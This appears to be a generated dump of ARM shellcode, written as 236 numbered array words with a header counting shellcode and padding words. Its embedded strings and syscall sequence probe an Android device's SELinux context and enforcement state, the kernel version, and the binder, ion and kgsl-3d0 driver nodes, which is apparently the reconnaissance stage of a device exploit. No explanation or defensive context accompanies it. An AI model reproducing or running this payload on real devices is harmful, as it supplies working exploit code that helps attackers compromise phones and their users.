Total words: 236
Shellcode words: 167, padding words: 69

        w[0]=0xE92D4FF0;w[1]=0xE24DD020;w[2]=0xE1A0A004;w[3]=0xE28ABB05;
        w[4]=0xE3A070C7;w[5]=0xEF000000;w[6]=0xE58B0000;w[7]=0xE3A070C8;
        w[8]=0xEF000000;w[9]=0xE58B0004;w[10]=0xE3A07014;w[11]=0xEF000000;
        w[12]=0xE58B0008;w[13]=0xE3A07040;w[14]=0xEF000000;w[15]=0xE58B000C;
        w[16]=0xE3A00015;w[17]=0xE3A01000;w[18]=0xE3A02000;w[19]=0xE3A03000;
        w[20]=0xE3A070AC;w[21]=0xEF000000;w[22]=0xE58B0010;w[23]=0xE3A00027;
        w[24]=0xE3A01000;w[25]=0xE3A02000;w[26]=0xE3A03000;w[27]=0xE3A070AC;
        w[28]=0xEF000000;w[29]=0xE58B0014;w[30]=0xE3E00063;w[31]=0xE28F1E1B;
        w[32]=0xE3A02000;w[33]=0xE3A03000;w[34]=0xE3007142;w[35]=0xEF000000;
        w[36]=0xE58B0018;w[37]=0xE3500000;w[38]=0xBA00000F;w[39]=0xE1A04000;
        w[40]=0xE1A00004;w[41]=0xE28A1C15;w[42]=0xE3A020FF;w[43]=0xE3A07003;
        w[44]=0xEF000000;w[45]=0xE58B001C;w[46]=0xE3500000;w[47]=0xDA000002;
        w[48]=0xE28A2C15;w[49]=0xE3A03000;w[50]=0xE7C23000;w[51]=0xE1A00004;
        w[52]=0xE3A07006;w[53]=0xEF000000;w[54]=0xEA000001;w[55]=0xE3A03000;
        w[56]=0xE58B301C;w[57]=0xE3E00063;w[58]=0xE28F1F57;w[59]=0xE3A02002;
        w[60]=0xE3A03000;w[61]=0xE3007142;w[62]=0xEF000000;w[63]=0xE58B0020;
        w[64]=0xE3500000;w[65]=0xBA000001;w[66]=0xE3A07006;w[67]=0xEF000000;
        w[68]=0xE3E00063;w[69]=0xE28F1F4F;w[70]=0xE3A02002;w[71]=0xE3A03000;
        w[72]=0xE3007142;w[73]=0xEF000000;w[74]=0xE58B0028;w[75]=0xE3500000;
        w[76]=0xBA000001;w[77]=0xE3A07006;w[78]=0xEF000000;w[79]=0xE3E00063;
        w[80]=0xE28F1F47;w[81]=0xE3A02002;w[82]=0xE3A03000;w[83]=0xE3007142;
        w[84]=0xEF000000;w[85]=0xE58B002C;w[86]=0xE3500000;w[87]=0xBA000001;
        w[88]=0xE3A07006;w[89]=0xEF000000;w[90]=0xE3E00063;w[91]=0xE28F1C01;
        w[92]=0xE3A02000;w[93]=0xE3A03000;w[94]=0xE3007142;w[95]=0xEF000000;
        w[96]=0xE58B0030;w[97]=0xE3500000;w[98]=0xBA00000F;w[99]=0xE1A04000;
        w[100]=0xE1A00004;w[101]=0xE28A1C1E;w[102]=0xE3A020FF;w[103]=0xE3A07003;
        w[104]=0xEF000000;w[105]=0xE58B0034;w[106]=0xE3500000;w[107]=0xDA000002;
        w[108]=0xE28A2C1E;w[109]=0xE3A03000;w[110]=0xE7C23000;w[111]=0xE1A00004;
        w[112]=0xE3A07006;w[113]=0xEF000000;w[114]=0xEA000001;w[115]=0xE3A03000;
        w[116]=0xE58B3034;w[117]=0xE3E00063;w[118]=0xE28F10A4;w[119]=0xE3A02000;
        w[120]=0xE3A03000;w[121]=0xE3007142;w[122]=0xEF000000;w[123]=0xE58B0038;
        w[124]=0xE3500000;w[125]=0xBA000009;w[126]=0xE1A04000;w[127]=0xE1A00004;
        w[128]=0xE28B103C;w[129]=0xE3A02004;w[130]=0xE3A07003;w[131]=0xEF000000;
        w[132]=0xE1A00004;w[133]=0xE3A07006;w[134]=0xEF000000;w[135]=0xEA000001;
        w[136]=0xE3A030FF;w[137]=0xE58B303C;w[138]=0xE3A00C55;w[139]=0xE28DD020;
        w[140]=0xE8BD8FF0;w[141]=0x6F72702F;w[142]=0x65732F63;w[143]=0x612F666C;
        w[144]=0x2F727474;w[145]=0x72727563;w[146]=0x00746E65;w[147]=0x7665642F;
        w[148]=0x6E69622F;w[149]=0x00726564;w[150]=0x7665642F;w[151]=0x6E6F692F;
        w[152]=0x00000000;w[153]=0x7665642F;w[154]=0x73676B2F;w[155]=0x64332D6C;
        w[156]=0x00000030;w[157]=0x6F72702F;w[158]=0x65762F63;w[159]=0x6F697372;
        w[160]=0x0000006E;w[161]=0x7379732F;w[162]=0x2F73662F;w[163]=0x696C6573;
        w[164]=0x2F78756E;w[165]=0x6F666E65;w[166]=0x00656372;w[167]=0x00000000;
        w[168]=0x00000000;w[169]=0x00000000;w[170]=0x00000000;w[171]=0x00000000;
        w[172]=0x00000000;w[173]=0x00000000;w[174]=0x00000000;w[175]=0x00000000;
        w[176]=0x00000000;w[177]=0x00000000;w[178]=0x00000000;w[179]=0x00000000;
        w[180]=0x00000000;w[181]=0x00000000;w[182]=0x00000000;w[183]=0x00000000;
        w[184]=0x00000000;w[185]=0x00000000;w[186]=0x00000000;w[187]=0x00000000;
        w[188]=0x00000000;w[189]=0x00000000;w[190]=0x00000000;w[191]=0x00000000;
        w[192]=0x00000000;w[193]=0x00000000;w[194]=0x00000000;w[195]=0x00000000;
        w[196]=0x00000000;w[197]=0x00000000;w[198]=0x00000000;w[199]=0x00000000;
        w[200]=0x00000000;w[201]=0x00000000;w[202]=0x00000000;w[203]=0x00000000;
        w[204]=0x00000000;w[205]=0x00000000;w[206]=0x00000000;w[207]=0x00000000;
        w[208]=0x00000000;w[209]=0x00000000;w[210]=0x00000000;w[211]=0x00000000;
        w[212]=0x00000000;w[213]=0x00000000;w[214]=0x00000000;w[215]=0x00000000;
        w[216]=0x00000000;w[217]=0x00000000;w[218]=0x00000000;w[219]=0x00000000;
        w[220]=0x00000000;w[221]=0x00000000;w[222]=0x00000000;w[223]=0x00000000;
        w[224]=0x00000000;w[225]=0x00000000;w[226]=0x00000000;w[227]=0x00000000;
        w[228]=0x00000000;w[229]=0x00000000;w[230]=0x00000000;w[231]=0x00000000;
        w[232]=0x00000000;w[233]=0x00000000;w[234]=0x00000000;w[235]=0x00000000;
